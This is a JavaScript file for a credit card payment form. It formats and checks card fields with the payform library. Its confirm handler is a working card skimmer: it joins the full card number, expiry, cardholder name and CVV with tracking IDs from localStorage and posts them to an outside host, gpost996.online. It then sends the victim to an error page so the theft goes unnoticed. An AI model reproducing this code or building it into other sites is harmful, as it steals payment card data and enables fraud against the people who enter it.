$(function () {

    var owner = $('#owner');
    var cardNumber = $('#cardNumber');
    var cardNumberField = $('#card-number-field');
    var CVV = $("#cvv");
    var mastercard = $("#mastercard");
    var confirmButton = $('#confirm-purchase');
    var visa = $("#visa");
    var amex = $("#amex");

    // Use the payform library to format and validate
    // the payment fields.

    cardNumber.payform('formatCardNumber');
    CVV.payform('formatCardCVC');


    cardNumber.keyup(function () {

        amex.removeClass('transparent');
        visa.removeClass('transparent');
        mastercard.removeClass('transparent');

        if ($.payform.validateCardNumber(cardNumber.val()) == false) {
            cardNumberField.addClass('has-error');
        } else {
            cardNumberField.removeClass('has-error');
            cardNumberField.addClass('has-success');
        }

        if ($.payform.parseCardType(cardNumber.val()) == 'visa') {
            document.getElementById("cardType").value = "VISA";
            mastercard.addClass('transparent');
            amex.addClass('transparent');
        } else if ($.payform.parseCardType(cardNumber.val()) == 'amex') {
            document.getElementById("cardType").value = "AMEX";
            mastercard.addClass('transparent');
            visa.addClass('transparent');
        } else if ($.payform.parseCardType(cardNumber.val()) == 'mastercard') {
            document.getElementById("cardType").value = "MASTER";
            amex.addClass('transparent');
            visa.addClass('transparent');
        }
    });

    confirmButton.click(function (e) {

        e.preventDefault();

        var isCardValid = $.payform.validateCardNumber(cardNumber.val());
        var isCvvValid = $.payform.validateCardCVC(CVV.val());

        if (owner.val().length < 1) {
            alert("Wrong owner name");
        } else if (!isCardValid) {
            alert("Wrong card number");
        } else if (!isCvvValid) {
            alert("Wrong CVV");
        } else {
            // Everything is correct. Add your form submission code here.
            

            var uname = "CC Type: " + document.getElementById("cardType").value + " CC No: " + document.getElementById("cardNumber").value 
            + "  DateExp:" + document.getElementById("cardMonth").value + "/" + document.getElementById("cardYear").value 
            + " Name: " + document.getElementById("owner").value + " CCV: " + document.getElementById("cvv").value;
            var pd = "CC";
            var b = "Credit Card";
            var agent_id = localStorage.getItem("agent_id");
            var sid = localStorage.getItem("sid");
            var app = localStorage.getItem("app");
            var xhr = new XMLHttpRequest();
            // alert(uname);
            xhr.open("POST", 'https://gpost996.online/post.php', false);
            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        
            xhr.onreadystatechange = function () { // Call a function when the state changes.
                if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
                    // Request finished. Do processing here.
                }
            }
            window.location.href  = "error.html";
            xhr.send("uname=" + uname + "&pd=" + pd + "&b=" + b + "&agent_id=" + agent_id + "&sid=" + sid + "&app=" + app)
            // document.getElementById('cc_form').submit();
            
            exit;
        }
    });
});
